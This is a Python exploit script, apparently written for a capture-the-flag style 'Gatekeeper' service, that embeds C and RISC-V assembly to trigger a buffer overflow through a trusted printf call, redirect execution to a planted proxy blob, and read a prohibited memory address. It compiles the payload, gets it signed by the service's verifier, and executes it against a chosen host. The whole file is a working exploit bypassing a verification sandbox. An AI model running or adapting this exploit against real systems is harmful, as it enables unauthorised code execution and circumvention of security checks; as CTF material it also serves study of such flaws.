#!/usr/bin/env python3

from __future__ import annotations

import os
import shutil
import sys
import base64
import asyncio
import aiohttp
import tempfile
import argparse
from pathlib import Path

CHECKER_ROOT = Path(__file__).resolve().parents[1] / "checker"
MAKE_DIR = Path(__file__).resolve().parents[1] / "service" / "example_program"
print(CHECKER_ROOT)
if str(CHECKER_ROOT) not in sys.path:
    sys.path.insert(0, str(CHECKER_ROOT))

from proggen.compile import CompileError, make_compile  # type: ignore[import]
from service_client import GatekeeperClient  # type: ignore[import]


def main():
    parser = argparse.ArgumentParser(description="Exploit trusted functions")
    parser.add_argument(
        "--host",
        type=str,
        default="localhost",
        help="Target host to exploit",
    )
    args = parser.parse_args()

    exp_src = r"""
#include "ministd.h"
#include "trusted_lib_api.h"
#include <stdint.h>

void target_fn()
{
    TRUSTED_CALL_VOID(mini_printf,
                      "Should be only seen in QEMU! Reading Prohibited address: %llx\n",
                      *(uint64_t*)0x13400000);
    ENTRY_POINT_END();
}

void proxy()
{
    __asm__ __volatile__(".globl proxy_blob_begin\n"
                         "proxy_blob_begin:\n"
                         ".option push\n"
                         ".option nopic\n" // ensure `la` expands to auipc+addi, not GOT
                         ".option norvc\n"

                         "la     t0, __abs_target\n" //
                         "ld     t0, 0(t0)\n"        //
                         "jalr   ra, t0, 0\n"        //
                         "ret\n"

                         ".balign 8\n"
                         "__abs_target:\n"
                         ".dword  target_fn\n" // embed absolute pointer inside the blob

                         ".option pop\n"
                         ".globl proxy_blob_end\n"
                         "proxy_blob_end:\n");
}

ENTRY_POINT_ATTR void start()
{
    // Triggers BOF, and jumps to our pre-inited data.
    memcpy((void*)0x313130, (void*)&proxy, 0x40);
    TRUSTED_CALL_VOID(mini_printf, "%b\n", 0b110ull << 56ull);
    ENTRY_POINT_END();
}
    """

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        src_path = tmp_path / "exploit-trusted-funcs-bof.c"
        src_path.write_text(exp_src)

        out_dir = tmp_path / "out"

        try:
            bin_path = make_compile(
                MAKE_DIR,
                src_path,
                out_dir,
                extra_cflags="-O0",
                target="prog",
                comptime_seed=1,
            )
        except CompileError as exc:
            print(f"failed to compile exploit-trusted-funcs-bof.c: {exc}")
            return

        program_b64 = base64.b64encode(bin_path.read_bytes()).decode()

    client = GatekeeperClient(args.host)
    verify_result = client.verify_program_sync(
        {"program": program_b64},
    )
    print("Verify result:", verify_result)

    execute_result = client.execute_program_sync(
        {"signature": verify_result["signature"], "program": program_b64}
    )
    print("Execution result:", execute_result)


if __name__ == "__main__":
    main()
